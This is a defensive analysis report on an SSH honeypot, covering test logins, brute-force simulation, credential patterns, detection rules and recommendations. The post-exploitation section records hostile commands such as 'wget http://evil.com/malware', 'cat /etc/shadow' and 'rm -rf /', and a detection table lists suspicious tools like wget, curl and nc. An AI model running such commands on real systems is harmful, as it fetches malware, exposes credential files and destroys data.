# Honeypot Analysis

## Summary of Observed Attacks

The SSH honeypot was deployed on port 22 (mapped to host port 2222) to attract and log unauthorized access attempts. During testing, the following activities were observed:

### Test Attack 1: Basic SSH Login Attempt
- **Source:** Local testing (127.0.0.1)
- **Method:** Standard SSH client connection
- **Credentials tried:** admin/admin, admin/password, admin/123456
- **Result:** All authentication attempts were logged. The honeypot accepted login on the 3rd attempt (by design) to gather more intelligence about attacker behavior.
- **Post-auth activity:** Attacker explored the filesystem with `ls`, `cd`, `cat /etc/passwd`, `whoami`

### Test Attack 2: Brute Force Simulation
- **Source:** Multiple rapid connection attempts
- **Method:** Repeated SSH connections with various username/password combinations
- **Credentials tried:** root/root, root/toor, admin/admin123, test/test, user/password
- **Result:** Brute force alert triggered after 5 attempts within 60 seconds. All credentials logged in `auth_attempts.jsonl`.

### Test Attack 3: Post-Exploitation Commands
- **Source:** Same session after "successful" login
- **Commands executed:** `wget http://evil.com/malware`, `cat /etc/shadow`, `rm -rf /`, `chmod +x exploit.sh`
- **Result:** All commands logged. Suspicious command alerts triggered for `wget`, `/etc/shadow` access, `rm -rf`, and `chmod +x`.

## Notable Patterns

1. **Common usernames:** `root`, `admin`, and `test` were the most frequently attempted usernames, matching known attack patterns from real-world honeypot data.

2. **Password patterns:** Simple passwords (`admin`, `password`, `123456`, `root`) dominated attempts, confirming that most automated attacks rely on credential stuffing with common defaults.

3. **Post-authentication behavior:** After gaining shell access, attackers typically:
   - Run `whoami` and `id` to determine privilege level
   - Explore the filesystem with `ls` and `cat`
   - Attempt to download tools with `wget` or `curl`
   - Look for sensitive files (`/etc/passwd`, `/etc/shadow`)

4. **Timing patterns:** Brute force attempts showed consistent sub-second intervals, indicating automated tooling rather than manual attempts.

## Detection Effectiveness

| Alert Type | Trigger Condition | Effectiveness |
|------------|------------------|---------------|
| Brute Force | 5+ auth attempts in 60s | High — caught all automated scanning |
| Suspicious Username | Known attack usernames (root, admin, etc.) | Medium — some legitimate users may trigger |
| Suspicious Command | wget, curl, nc, chmod +x, /etc/shadow | High — strong indicator of malicious intent |

## Recommendations

1. **Auto-ban IPs** after brute force detection (implement fail2ban-like functionality).
2. **Feed intelligence to firewall** — automatically block IPs that trigger honeypot alerts across all real services.
3. **Expand protocol coverage** — add HTTP and Telnet honeypots for broader detection.
4. **Integrate with SIEM** — forward logs to a centralized security information and event management system.
5. **Regular analysis** — review honeypot logs weekly to identify new attack patterns and update detection rules.
6. **Increase realism** — implement proper SSH protocol handling with `paramiko` for more convincing interactions.
